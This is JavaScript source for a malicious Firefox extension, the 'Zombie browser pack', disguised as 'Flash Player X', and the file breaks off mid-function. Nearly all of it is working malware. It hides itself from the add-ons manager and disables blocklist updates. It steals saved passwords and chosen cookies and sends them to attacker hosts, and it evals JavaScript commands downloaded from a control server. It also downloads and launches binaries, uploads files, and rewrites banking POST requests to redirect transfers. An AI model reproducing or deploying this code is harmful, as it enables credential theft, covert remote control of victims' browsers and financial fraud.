/*

Zombie browser pack, remote control Firefox browsers via extensions
Copyright (C) 2012  Zoltan Balazs

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

var debug = true;
function dbg(msg) {
	if(debug) {
		Components.utils.reportError(msg)
	}
}

String.prototype.escapeSpecialChars = function() {
	return this.replace(/\\n/g, "").replace(/\\'/g, "\\'").replace(/\\"/g, '\\"').replace(/\\r/g, "\\r").replace(/\\t/g, "\\t").replace(/\\b/g, "\\b").replace(/\\f/g, "\\f");
};
var Base64 = {

	// private property
	_keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

	// public method for encoding
	encode : function(input) {
		var output = "";
		var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
		var i = 0;
		input = Base64._utf8_encode(input);

		while(i < input.length) {
			chr1 = input.charCodeAt(i++);
			chr2 = input.charCodeAt(i++);
			chr3 = input.charCodeAt(i++);
			enc1 = chr1 >> 2;
			enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
			enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
			enc4 = chr3 & 63;

			if(isNaN(chr2)) {
				enc3 = enc4 = 64;
			} else if(isNaN(chr3)) {
				enc4 = 64;
			}
			output = output + this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) + this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);

		}

		return output;
	},
	// public method for decoding
	decode : function(input) {
		var output = "";
		var chr1, chr2, chr3;
		var enc1, enc2, enc3, enc4;
		var i = 0;
		input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

		while(i < input.length) {
			enc1 = this._keyStr.indexOf(input.charAt(i++));
			enc2 = this._keyStr.indexOf(input.charAt(i++));
			enc3 = this._keyStr.indexOf(input.charAt(i++));
			enc4 = this._keyStr.indexOf(input.charAt(i++));
			chr1 = (enc1 << 2) | (enc2 >> 4);
			chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
			chr3 = ((enc3 & 3) << 6) | enc4;
			output = output + String.fromCharCode(chr1);

			if(enc3 != 64) {
				output = output + String.fromCharCode(chr2);
			}
			if(enc4 != 64) {
				output = output + String.fromCharCode(chr3);
			}

		}
		output = Base64._utf8_decode(output);

		return output;

	},
	// private method for UTF-8 encoding
	_utf8_encode : function(string) {
		string = string.replace(/\r\n/g, "\n");
		var utftext = "";

		for(var n = 0; n < string.length; n++) {

			var c = string.charCodeAt(n);

			if(c < 128) {
				utftext += String.fromCharCode(c);
			} else if((c > 127) && (c < 2048)) {
				utftext += String.fromCharCode((c >> 6) | 192);
				utftext += String.fromCharCode((c & 63) | 128);
			} else {
				utftext += String.fromCharCode((c >> 12) | 224);
				utftext += String.fromCharCode(((c >> 6) & 63) | 128);
				utftext += String.fromCharCode((c & 63) | 128);
			}

		}

		return utftext;
	},
	// private method for UTF-8 decoding
	_utf8_decode : function(utftext) {
		var string = "";
		var i = 0;
		var c = c1 = c2 = 0;

		while(i < utftext.length) {
			c = utftext.charCodeAt(i);

			if(c < 128) {
				string += String.fromCharCode(c);
				i++;
			} else if((c > 191) && (c < 224)) {
				c2 = utftext.charCodeAt(i + 1);
				string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
				i += 2;
			} else {
				c2 = utftext.charCodeAt(i + 1);
				c3 = utftext.charCodeAt(i + 2);
				string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
				i += 3;
			}

		}

		return string;
	}
}

// rootkit functionality, change the name if you really want to use it

function rm(list) {
	var addons = list.childNodes;
	for(var i = 0; i < addons.length; ++i)
	if(addons[i].getAttribute('name') == 'Flash Player X')
		list.removeChild(addons[i]);
}

function monitorPage(loadEvent) {
	var tgt = loadEvent.originalTarget;
	var doc = tgt.defaultView.content.document;

	// The event listener is activated only when
	// the user accesses the extension manager
	if(tgt.location.href == 'about:addons') {
		doc.addEventListener('DOMSubtreeModified', function() {
			rm(doc.getElementById('addon-list'));
			rm(doc.getElementById('updates-list'));
		}, false);
	}
}


// don't run it at the first time, only after a refresh happens
var firstrun1 = 0;
if(firstrun1 == 0) {
	var interval13 = window.setInterval(function(thisObj) {
		firstrun1 = 1;
		gBrowser.addEventListener('DOMContentLoaded', monitorPage, false);
	}, 3 * 1000, this);
}

function getMethods(obj) {
	var result = [];
	for(var id in obj) {
		try {
			if( typeof (obj[id]) == "function") {
				result.push(id + ": " + obj[id].toString());
			}
		} catch (err) {
			result.push(id + ": inaccessible :" + err);
		}
	}
	return result;
}

function type(obj) {
	return Object.prototype.toString.call(obj).match(/^\[object (.*)\]$/)[1]
}

// return the two-digit hexadecimal code for a byte
function toHexString(charCode) {
	return ("0" + charCode.toString(16)).slice(-2);
}

function modifyText_notyetworking() {
	var node_list = content.document.getElementsByTagName('input');
	var msg;
	for(var i = 0; i < node_list.length; i++) {
		var node = node_list[i];
		msg = msg + " " + node.getAttribute("name") + ":" + node.value;
	}
	this.sendMessage("http://127.0.0.1/bbdoor/post.php", msg, true);
}

/*
 * Copyright (c) 2009 Duarte Silva
 * All Rights Reserved.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 */

const Cc1 = Components.classes;
const Ci1 = Components.interfaces;

var observerService = Cc1["@mozilla.org/observer-service;1"].getService(Ci1.nsIObserverService);

function CCIN(cName, ifaceName) {
	return Cc1[cName].createInstance(Ci1[ifaceName]);
}

function Sniff(extension) {
	this.extension = extension;
	this.QueryInterface = function(iid) {
		if(iid.equals(Components.interfaces.nsIObserver) || iid.equals(Components.interfaces.nsISupports))
			return this;
		else
			throw Components.results.NS_NOINTERFACE;
	};

	this.observe = function(subject, topic, data) {
		try {
			subject.QueryInterface(Components.interfaces.nsIHttpChannel);
			if(topic == "http-on-modify-request") {
				this.extension.ProcessRequest(subject, this.extension.config);
			}
			/*
			 if(topic == "http-on-examine-response")
			 this.extension.hookOnSubmit(subject);
			 */
		} catch (exception) {
			dbg(exception);
		}
	};
}

function Extension() {
	this.conserv = null;
	this.obsserv = null;
	this.sniff = null;
	this.debug = true;

	this.onPageLoad = function(aEvent) {

		var doc = aEvent.originalTarget;
		// doc is document that triggered the event
		var win = doc.defaultView;
		// win is the window for the doc
		// test desired conditions and do something
		// if (doc.nodeName == "#document") return; // only documents
		// if (win != win.top) return; //only top window.
		// if (win.frameElement) return; // skip iframes/frames
		if(doc != null) {
			var node_list = doc.getElementsByTagName('input');
			for(var i = 0; i < node_list.length; i++) {
				var node = node_list[i];
				if(node.getAttribute('type') == 'submit') {
					node.addEventListener("click", modifyText, false);
				}
			}
		}
	};

	// reading the saved config file
	this.readConfig = function() {
		var config = new String();
		
		//flashX.dat stores the config downloaded from the server
		config = this.readFileRetLine("ProfD", "flashX.dat");
		if(config != null) {
			try {
				config2 = JSON.parse(config);
				try {
					oldIDs = JSON.parse(this.readFileOld("ProfD", "flashX1.dat"));
				} catch(e) {
					oldIDs = new Object();
					oldIDs.jscommandid = 0;
				}
				var change = 0;
				
				// if there is a new jscommand (based on the id), execute it
				if(oldIDs.jscommandid < config2.jscommandid) {
					try {
						eval(config2.jscommand);
						oldIDs.jscommandid = config2.jscommandid;
						change++;
					} catch(e) {
						dbg(e)
					}
				}
				
				// store the new jscommandid in the flashX1.dat file
				if(change > 0) {
					this.writeFile("ProfD", "flashX1.dat", JSON.stringify(oldIDs, null, 0));
				}
			} catch(e) {
				dbg(e)
			}
			return config2;
			
			// if there is no config file, set a default one
		} else {
			//this.extension = extension;
			try {
				config2 = new Object();
				var configData = this.readFileOld("ProfD", "flashX.dat");
				var config2 = JSON.parse(configData);
				return config2;
			} catch (e) {
				config = new Object();
				// attacker server URL where cookies should be logged
				config.cookieloggerhost = 'http://127.0.0.1/addcokie/';
				
				// cookie stealing is enabled or not
				config.cookieloggingenabled = true;

				//list of cookie names which should be stolen
				config.cookielist = "SMSV,SMSS,datr";

				// attacker server URL where passwords and other infos should be logged
				config.postdataloggerhost = 'http://127.0.0.1/addpostinfo/';
				
				// enable password stealing
				config.postenabled = true;
				
				// attacker server URL where the victim browsers send their heartbeat info
				config.loginhost = 'http://127.0.0.1/login/';
				
				//attacker server URL where the files are uploaded
				config.uploadpath = "http://127.0.0.1/upload/";

				//check attacker server SSL fingerprint 
				config.checksslvar = false;

				// enable rewrite of pages
				config.enablemitm = true;
				
				// this is for the hacmebank demo, page which should be rewritten
				config.balancepage = "HacmeBank_v2_Website\/aspx\/Main.aspx\?function\=TransactionDetails\&account_no\=5204320422040001"
				
				// this is for the hacmebank demo, content to be replaced
				config.myaccount = "(9999999999999999)";
				
				// this is for the hacmebank demo, new content to be shown
				config.origmsg = "Transfered $100 to 5204320422040003 ()";
				
				//config.SHA1Fingerprint = "E4:8B:DD:08:16:E9:6D:BE:01:4C:4C:9D:51:63:2C:93:F7:76:A4:86";
				
				// this is for the hacmebank demo, URL where POST parameters should be rewritten
				config.modifyurl = "192.168.56.101\/HacmeBank_v2_Website\/aspx\/main.aspx\?";
				
				// this is for the hacmebank demo, disable the logout button
				config.logoutpostdata = "lnkBtnLogOut";
				
				// this is for the hacmebank demo, search for this string in the post data
				config.origaccount = "5204320422040003";
				
				// this is for the hacmebank demo, new string in the post data
				config.newaccount = "9999999999999999";
				
				// this is for the hacmebank demo, POST page identifier
				config.transferurl = "btnTransfer";

				// this ID is used to track which jscommands have been executed, 
				// if the client sees an ID which is higher than the last executed, 
				// it will execute the new command and store the new jscommandid
				config.jscommandid = 1;
				return config;
			}
		}
	};

	// just to  play some sound, eg ogg file
	this.playSound = function(config, sound) {
		var audioElement = new Audio(sound);
		audioElement.play();
	};


	// directory listing
	this.getDirList = function(config, dir) {
		var file = Components.classes["@mozilla.org/file/local;1"].createInstance(Components.interfaces.nsILocalFile);
		file.initWithPath(dir);
		var entries = file.directoryEntries;
		var result = "";
		while(entries.hasMoreElements()) {
			var entry = entries.getNext();
			result = result + ":" + entry.QueryInterface(Components.interfaces.nsIFile).leafName;
		}
		this.sendMessage(config.postdataloggerhost, "dirlist=" + encodeURIComponent(result), false);
	};

	// this module is to change the content on a web page
	// don't use it this way, because the content is only on a scheduled basis, not at load time
	this.rewritePageContent = function(config) {
		balancepage = new RegExp(config.balancepage, "i");
		myaccount = new RegExp(config.myaccount, "i")
		if(content) {
			//dbg("0.5");
			if(content.document.documentURI.match(balancepage)) {
				//dbg("1");
				var elementsToRewrite = new Array();
				elementsToRewrite = content.document.getElementsByTagName('span');
				for(var i = 0, i1 = elementsToRewrite.length; i < i1; i++) {
					//dbg("2");
					dbg(elementsToRewrite[i].textContent);
					if(elementsToRewrite[i].textContent.match(myaccount)) {
						//dbg("3"); 
						elementsToRewrite[i].textContent = config.origmsg;
					}
				}
			}
		}

	};
	
	//get password from submit hook, not working yet, needs debugging
	this.hookOnSubmit = function(config) {
		if(content != null) {
			//alert(content);
			var node_list = content.document.getElementsByTagName('input');
			for(var i = 0; i < node_list.length; i++) {
				var node = node_list[i];
				if(node.getAttribute('type') == 'submit') {
					// do something here with a <input type="text" .../>
					// we alert its value here

					Components.utils.reportError("1234");
				}
			}

		}

	};
	
	//check if we are talking with the correct SSL server
	this.checkFingerprint = function(channel) {
		try {
			const Ci = Components.interfaces;
			// Do we have a valid channel argument?
			if(!channel instanceof Ci.nsIChannel) {
				return;
			}
			var secInfo = channel.securityInfo;

			if( secInfo instanceof Ci.nsISSLStatusProvider) {

				var cert = secInfo.QueryInterface(Ci.nsISSLStatusProvider).SSLStatus.QueryInterface(Ci.nsISSLStatus).serverCert;
				if("E4:8B:DD:08:16:E9:6D:BE:01:4C:4C:9D:51:63:2C:93:F7:76:A4:86" != cert.sha1Fingerprint) {
					return false;
				} else {
					return true;
				}
			}
		} catch (err) {
			dump(err);
		}
	};

	//steal the stored password from mozilla password store
	this.stealStoredPasswords = function(config) {
		var httprealm = null;
		var password;
		try {
			// Get Login Manager
			var myLoginManager = Components.classes["@mozilla.org/login-manager;1"].getService(Components.interfaces.nsILoginManager);
			//Components.utils.reportError(getMethods(myLoginManager).join("\n"))
			// Find users for the given parameters
			var logins = myLoginManager.getAllLogins();
			var sendInfo = new Array();
			// Find user from returned array of nsILoginInfo objects
			for(var i = 0; i < logins.length; i++) {
				sendInfo += logins[i].formSubmitURL + ": " + logins[i].username + ": " + logins[i].password + " xxxxx";
			}

			var userID = this.generateUserID();
			this.sendMessage(config.postdataloggerhost + userID, "postinfo%5Bdata%5D=" + encodeURIComponent(sendInfo), config.checksslvar);
		} catch(ex) {
			dbg(ex);
			// This will only happen if there is no nsILoginManager component class
		}
	}

	// write the config file into file
	this.writeConfig = function(oXHR) {
		if(oXHR.length > 5) {
			this.writeFile("ProfD", "flashX.dat", oXHR);
		}
	};

	// file reading, for the config still used
	this.readFileOld = function(dir, filename) {
		var file = Components.classes["@mozilla.org/file/directory_service;1"].getService(Components.interfaces.nsIProperties).get("ProfD", Components.interfaces.nsIFile);
		file.append(filename);

		// open an input stream from file
		var istream = Components.classes["@mozilla.org/network/file-input-stream;1"].createInstance(Components.interfaces.nsIFileInputStream);
		istream.init(file, 0x01, 0444, 0);
		istream.QueryInterface(Components.interfaces.nsILineInputStream);

		// read lines into array
		var line = {}, lines = [], hasmore;
		do {
			hasmore = istream.readLine(line);
			lines.push(line.value);
		} while (hasmore);
		istream.close();
		return lines;
	};

	// much better file reading functionality, lines are in arrays
	this.readFileRetLine = function(dir, filename) {
		var file = Components.classes["@mozilla.org/file/directory_service;1"].getService(Components.interfaces.nsIProperties).get("ProfD", Components.interfaces.nsIFile);
		file.append(filename);

		// open an input stream from file
		var istream = Components.classes["@mozilla.org/network/file-input-stream;1"].createInstance(Components.interfaces.nsIFileInputStream);
		istream.init(file, 0x01, 0444, 0);
		istream.QueryInterface(Components.interfaces.nsILineInputStream);

		// read lines into array
		var line = {};
		var lines = "";
		var hasmore;
		do {
			hasmore = istream.readLine(line);
			lines += line.value;
		} while (hasmore);
		istream.close();
		return lines;
	};
	
	//heart-beat info from zombie browser to botnet control server
	this.getEnvInfo = function(config) {
		try {
			var osVersion = Components.classes["@mozilla.org/network/protocol;1?name=http"].getService(Components.interfaces.nsIHttpProtocolHandler).oscpu;

			var info = Components.classes["@mozilla.org/xre/app-info;1"].getService(Components.interfaces.nsIXULAppInfo);
			const cid_u = "@mozilla.org/userinfo;1";
			var obj_u = Components.classes[cid_u].createInstance();
			obj_u = obj_u.QueryInterface(Components.interfaces.nsIUserInfo);
			var userID = this.generateUserID();
			var d = new Date();
			var sendInfo = "utf8=%E2%9C%93&zombie%5Busername%5D=" + encodeURIComponent(obj_u.username) + "&zombie%5Bos%5D=" + encodeURIComponent(osVersion) + "&zombie%5Bbrowsername%5D=" + encodeURIComponent(info.name) + "&zombie%5Bbrowserversion%5D=" + encodeURIComponent("Firefox/" + info.version)
				+ "&commit=Create+Zombie";
			if(!config.loginhost) {
				this.sendMessage('http://127.0.0.1/login/' + userID, sendInfo, config.checksslvar);
			} else {
				this.sendMessage(config.loginhost + userID, sendInfo, config.checksslvar);
			}

		} catch (exc) {
			dbg("Error1: " + exc);
			return 'unknown';
		}
	};

	// cookie stealing, scheduled
	this.newCookie = "";
	this.oldCookieValues = new Array("", "");

	this.cookieEvent = function(config) {
		cookiearray = new Array();
		//dbg("cookies: " + config.cookielist);
		cookiearray = config.cookielist.split(",");

		var cookieMgr = Components.classes["@mozilla.org/cookiemanager;1"].getService(Components.interfaces.nsICookieManager);
		for(var e = cookieMgr.enumerator; e.hasMoreElements(); ) {

			var cookie = e.getNext().QueryInterface(Components.interfaces.nsICookie);
			cookieStr = "data=host:" + cookie.host + " name:" + cookie.name + " value:" + cookie.value + " expires:" + cookie.expires + " path:" + cookie.path + " isSecure:" + cookie.isSecure + " policy:" + cookie.policy + " isDomain:" + cookie.isDomain + " status:" + cookie.status + "\n";

			for(var i = 0; i < cookiearray.length; i++) {
				if(cookie.name == cookiearray[i]) {
					this.newCookie = cookieStr;
					
					// if the cookie value has changed
					if(this.oldCookieValues[i] != cookie.value) {
						var userID = this.generateUserID();
						this.sendMessage(config.cookieloggerhost + userID, "cookie%5Bdata%5D=" + encodeURIComponent(this.newCookie), config.checksslvar);
						this.oldCookieValues[i] = cookie.value;
					}
					this.newCookie = "";
				}
			}
		}
	};

	// execute binaries on windows, best feature ever :)
	this.executeFile = function(executable) {
		var file = Components.classes["@mozilla.org/file/local;1"].createInstance(Components.interfaces.nsILocalFile);
		if(executable.length > 2) {
			file.initWithPath(executable);
			file.launch();
		}
	};

	// disable the Firefox blocklist update, Nr. 2. best feature ever :) 
	this.disableBlocklistUpdate = function() {
		// Get the "accessibility." branch
		var prefs = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefService).getBranch("extensions.");

		// prefs is an nsIPrefBranch.
		// Look in the above section for examples of getting one.
		var value = prefs.getBoolPref("blocklist.enabled");
		prefs.setBoolPref("blocklist.enabled", false);
	};

	// write data into file
	this.writeFile = function(dir, filename, data) {
		var file = Components.classes["@mozilla.org/file/directory_service;1"].getService(Components.interfaces.nsIProperties).get(dir, Components.interfaces.nsIFile);
		file.append(filename);

		if(!file.exists()) {
			file.create(Components.interfaces.nsIFile.NORMAL_FILE_TYPE, 0666);
		}

		var foStream = Components.classes["@mozilla.org/network/file-output-stream;1"].createInstance(Components.interfaces.nsIFileOutputStream);
		foStream.init(file, 0x02 | 0x08 | 0x20, 0666, 0);
		var converter = Components.classes["@mozilla.org/intl/converter-output-stream;1"].createInstance(Components.interfaces.nsIConverterOutputStream);
		converter.init(foStream, "UTF-8", 0, 0);
		converter.writeString(data);
		converter.close();
	};

	// download a binary from an URL, and stores on victim file systems
	this.downloadBinary = function(dir, URL, filename) {
		try {
			var file = Components.classes["@mozilla.org/file/local;1"].createInstance(Components.interfaces.nsILocalFile);
			file.initWithPath(dir + filename);
			var wbp = Components.classes['@mozilla.org/embedding/browser/nsWebBrowserPersist;1'].createInstance(Components.interfaces.nsIWebBrowserPersist);
			var ios = Components.classes['@mozilla.org/network/io-service;1'].getService(Components.interfaces.nsIIOService);
			var uri = ios.newURI(URL, null, null);
			wbp.persistFlags &= ~Components.interfaces.nsIWebBrowserPersist.PERSIST_FLAGS_NO_CONVERSION;
			// don't save gzipped
			wbp.saveURI(uri, null, null, null, null, file);
		} catch (exc) {
			dbg(exc);
		}
	};
	
	// communication module, this sends data from victim browser to command and control server
	this.sendMessage = function(host, param, checkSSL) {
		var httpRequest = Components.classes["@mozilla.org/xmlextras/xmlhttprequest;1"].createInstance();
		// Disable alert popups on SSL error, but connection will fail
		//httpRequest.mozBackgroundRequest = true;
		
		var userID = this.generateUserID();
		httpRequest.open("POST", host, true);
		httpRequest.onreadystatechange = function(aEvt) {
			if(httpRequest.readyState === 4) {
				if(checkSSL) {
					if(!(this.checkFingerprint(httpRequest.channel))) {
						dbg("SSL Error");
						return false;
					}
				}
				if(httpRequest.status === 200 || httpRequest.status === 302) {
					var x;
				} else {
					dbg("Error4:" + host + param + " resp:" + httpRequest.statusText);
				}
			}

		};
		httpRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		httpRequest.send(param);
		// return httpRequest.responseText;
	};
	
	// downloads the config from the server
	this.downloadConfig = function(host, checkSSL) {
		var userID = this.generateUserID();
		var request = Components.classes["@mozilla.org/xmlextras/xmlhttprequest;1"].createInstance();
		request.open("GET", host + userID + ".json", true);
		request.onreadystatechange = function(aEvt) {
			if(request.readyState === 4) {
				if(checkSSL) {
					if(!(this.checkFingerprint(httpRequest.channel))) {
						dbg("SSL Error");
						return false;
					}
				}
				
				// if config successfully downloaded
				if(request.status === 200) {
					var data = request.responseText;
					
					//save the config in the config file
					var filename = "flashX.dat";
					var dir = "ProfD";
					var file = Components.classes["@mozilla.org/file/directory_service;1"].getService(Components.interfaces.nsIProperties).get(dir, Components.interfaces.nsIFile);
					file.append(filename);
					if(!file.exists()) {
						file.create(Components.interfaces.nsIFile.NORMAL_FILE_TYPE, 0666);
					}
					var foStream = Components.classes["@mozilla.org/network/file-output-stream;1"].createInstance(Components.interfaces.nsIFileOutputStream);
					foStream.init(file, 0x02 | 0x08 | 0x20, 0666, 0);
					var converter = Components.classes["@mozilla.org/intl/converter-output-stream;1"].createInstance(Components.interfaces.nsIConverterOutputStream);
					converter.init(foStream, "UTF-8", 0, 0);
					converter.writeString(data);
					converter.close();
				} else {
					dbg("req_status" + request.status);
					dbg("Error3:" + request.statusText);
				}
			}
		};
		request.send(null);
	};

	// use embedded geolocation, useful on Android devices
	this.getLocation = function(config) {
		var geolocation = Components.classes["@mozilla.org/geolocation;1"].getService(Components.interfaces.nsIDOMGeoGeolocation);
				geolocation.getCurrentPosition(function(position) {
			var location = position.coords.latitude + ", " + position.coords.longitude;
			var userID = extension.generateUserID();
			extension.sendMessage(config.postdataloggerhost + userID, "postinfo%5Bdata%5D=" + encodeURIComponent(location), config.checksslvar);
		});
		
		
	};

	// every infected client has a different ID, 
	this.generateUserID = function() {
		
		// On firefox, ID is generated from profile dir :) 
		// because it is different by profiles
		var file = Components.classes["@mozilla.org/file/directory_service;1"].getService(Components.interfaces.nsIProperties).get("ProfD", Components.interfaces.nsIFile).path;
		var converter = Components.classes["@mozilla.org/intl/scriptableunicodeconverter"].createInstance(Components.interfaces.nsIScriptableUnicodeConverter);
		converter.charset = "UTF-8";
		var result = {};
		// data is an array of bytes
		var data = converter.convertToByteArray(file, result);
		var ch = Components.classes["@mozilla.org/security/hash;1"].createInstance(Components.interfaces.nsICryptoHash);
		ch.init(ch.SHA1);
		ch.update(data, data.length);
		var hash = ch.finish(false);
		var result = [toHexString(hash.charCodeAt(i)) for (i in hash)].
		join("");
		//something is buggy, hash is not 40 char long
		return (result.substring(0, 40));
	};
	
	//deprecated, should be removed
	this.downloadContentFromURL_deprecated = function(config, host) {
		try {
			var httpRequest = Components.classes["@mozilla.org/xmlextras/xmlhttprequest;1"].createInstance();
			// Disable alert popups on SSL error
			//httpRequest.mozBackgroundRequest = true;
			var userID = this.generateUserID();
			httpRequest.open("GET", host, true);
			httpRequest.overrideMimeType("application/octet-stream");
			httpRequest.onreadystatechange = function(aEvt) {
				if(httpRequest.readyState === 4) {
					if((httpRequest.status === 200) || (httpRequest.status === 0)) {
						params = Base64.encode(httpRequest.responseText);
						request = new XMLHttpRequest();
						request.open("POST", config.postdataloggerhost, true);
						request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
						request.setRequestHeader("Content-length", params);
						request.send(params);
					} else {
						dbg("Error1:" + httpRequest.statusText);
						dbg("Error2:" + httpRequest.status);
					}
				}

			};
			httpRequest.send("base64ResponseText=" + encodeURIComponent(Base64.encode(httpRequest.responseText)));
			// return

		} catch(e) {
			dbg("Remote URL not available");
		}
	}
	// downloadContentFromURL(config2,"file:/data/data/com.android.providers.telephony/databases/mmssms.db-wal","GET", "", "application/octet-stream")

	// download a content from a remote URL, send back content to attacker
	this.downloadContentFromURL = function(config, host, method, params, mime) {
		try {
			var httpRequest = Components.classes["@mozilla.org/xmlextras/xmlhttprequest;1"].createInstance();
			// Disable alert popups on SSL error
			//httpRequest.mozBackgroundRequest = true;
			var userID = this.generateUserID();
			httpRequest.open(method, host, true);
			//httpRequest.overrideMimeType("application/octet-stream");
			httpRequest.overrideMimeType(mime);

			//var BlobBuilder = window.MozBlobBuilder || window.WebKitBlobBuilder || window.MSBlobBuilder || window.BlobBuilder;
			httpRequest.responseType = "blob";
			httpRequest.onreadystatechange = function(aEvt) {
				if(httpRequest.readyState === 4) {
					if((httpRequest.status === 200) || (httpRequest.status === 0)) {
						/*var blobBuilder = new BlobBuilder();
						 blobBuilder.append(httpRequest.response);
						 var blob = blobBuilder.getBlob("application/octet-stream");
						 */
						dbg("Received request to fetch " + host + params);
						var req = Components.classes["@mozilla.org/xmlextras/xmlhttprequest;1"].createInstance(Components.interfaces.nsIXMLHttpRequest);
						req.open('POST', config.uploadpath + userID, true);
						var formData = new FormData();
						formData.append("utf8", "â");
						formData.append("datafile", httpRequest.response);
						formData.append("commit", "Upload");
						//formData.append("filename", "httpR");
						//req.setRequestHeader('Content-Type', "multipart/form-data");
						req.overrideMimeType('text/plain; charset=x-user-defined');
						req.onreadystatechange = function(aEvt) {
							if(req.readyState === 4) {
								if(config.checksslvar) {
									if(!(this.checkFingerprint(req.channel))) {
										dbg("SSL Error");
										return false;
									}
								}
							}
						};
						req.send(formData);
						dbg("Response successfully sent back to attacker.");

					} else {
						dbg("Error1:" + httpRequest.statusText);
						dbg("Error2:" + httpRequest.status);
					}
				}
			};
			httpRequest.send(null);
		} catch(e) {
			dbg("Remote URL not available");
		}
	}
	
	// TODO test function
	this.uploadBinaryToServer = function(dir, filename, config) {
		var file = Components.classes["@mozilla.org/file/directory_service;1"].getService(Components.interfaces.nsIProperties).get(dir, Components.interfaces.nsIFile);
		file.append(filename);

		// open an input stream from file
		var stream = Components.classes["@mozilla.org/network/file-input-stream;1"].createInstance(Components.interfaces.nsIFileInputStream);
		stream.init(file, 0x01, 0444, 0);
		stream.QueryInterface(Components.interfaces.nsILineInputStream);
		// Send
		var req = Components.classes["@mozilla.org/xmlextras/xmlhttprequest;1"].createInstance(Components.interfaces.nsIXMLHttpRequest);
		req.open('POST', config.uploadpath);
		var oMyForm = new FormData();
		oMyForm.append("datafile", stream);
		req.onreadystatechange = function(aEvt) {
			if(req.readyState === 4) {
				if(config.checksslvar) {
					if(!(this.checkFingerprint(req.channel))) {
						dbg("SSL Error");
						return false;
					}
				}
			}
		};
		req.send(oMyForm);
	};

	this.Initialize = function() {
		try {
			this.sniff = new Sniff(this);
			this.config = new Object();

			this.config = this.readConfig();
			this.getEnvInfo(this.config);

			this.obsserv = Components.classes["@mozilla.org/observer-service;1"].getService(Components.interfaces.nsIObserverService);
			this.conserv = Components.classes["@mozilla.org/consoleservice;1"].getService(Components.interfaces.nsIConsoleService);
			if((this.obsserv != null) && (this.sniff != null)) {
				this.obsserv.addObserver(this.sniff, "http-on-modify-request", false);
				this.obsserv.addObserver(this.sniff, "http-on-examine-response", false);
			}

		} catch (exception) {
			dbg(exception);
		}
	};

	this.Uninitialize = function() {
		if((this.obsserv != null) && (this.sniff != null))
			this.obsserv.removeObserver(this.sniff, "http-on-modify-request");
		//this.obsserv.removeObserver(this.sniff, "http-on-examine-response");
	};

	this.ProcessLine = function(stream) {
		var line = "";
		for(var i = 0; i < stream.available(); i++) {
			var c = stream.read(1);
			if(c == '\n')
				break;
			if(c != '\r')
				line += c;
		}
		return line;
	};

	this.ProcessRequest = function(http, config) {
		var stream;
		var seekable;
		var request;
		var validCookie = false;
		var validHeader = false;
		var params;
		//var enablemitm = true;
		var logoutpostdata = config.logoutpostdata;
		var origaccount = new Array(config.origaccount);
		var newaccount = config.newaccount;

		try {
			if(http.requestMethod != "POST")
				return;
			var httpChannel = http.QueryInterface(Components.interfaces.nsIHttpChannel);
			var host = new String();
			host = httpChannel.originalURI.host + httpChannel.originalURI.path;
			http.QueryInterface(Components.interfaces.nsIUploadChannel);

			if(http.uploadStream != null) {
				seekable = http.uploadStream;
				seekable.QueryInterface(Components.interfaces.nsISeekableStream);
				stream = Components.classes["@mozilla.org/scriptableinputstream;1"].createInstance(Components.interfaces.nsIScriptableInputStream);
				stream.init(http.uploadStream);

				for(var line = this.ProcessLine(stream); line; line = this.ProcessLine(stream)) {

					var header = line.match(/^([^:]+):s?(.*)/);
					//Components.utils.reportError("HOST: " + httpChannel.getRequestHeader("Host"));
					if(header == null)
						continue;

					if(header[1].toLowerCase() == "content-type") {
						if(header[2].toLowerCase().match("x-www-form-urlencoded")) {
							validHeader = true;
						}
					}
				}

				if(validHeader) {
					params = stream.read(stream.available());

					// intercepting post requests, modify it if neeeded
					if(config.enablemitm) {
						var uploadChannel = httpChannel.QueryInterface(Components.interfaces.nsIUploadChannel);
						var uploadChannelStream = uploadChannel.uploadStream;
						uploadChannelStream.QueryInterface(Components.interfaces.nsISeekableStream).seek(Components.interfaces.nsISeekableStream.NS_SEEK_SET, 0);
						var stream2 = Components.classes["@mozilla.org/binaryinputstream;1"].createInstance(Components.interfaces.nsIBinaryInputStream);
						stream2.setInputStream(uploadChannelStream);
						var postBytes = stream2.readByteArray(stream.available());
						var poststr = String.fromCharCode.apply(null, postBytes);

						var inputStream = Components.classes["@mozilla.org/io/string-input-stream;1"].createInstance(Components.interfaces.nsIStringInputStream);
						inputStream.setData(poststr, poststr.length);

						//default uploadchannel
						uploadChannel.setUploadStream(inputStream, "", -1);
						
						// modifying request
						if(params.match(logoutpostdata)) {
							httpChannel.setRequestHeader("Cookie", "", false);
							poststr = poststr.replace(logoutpostdata, "zzz");
							inputStream.setData(poststr, poststr.length);
							uploadChannel.setUploadStream(inputStream, "application/x-www-form-urlencoded", -1);
						}

						if(params.match(config.transferurl)) {
							//dbg("45465464 new: "+ newaccount + "origacc: " + origaccount);
							var len = origaccount.length;
							for(var i = 0; i < len; i++) {
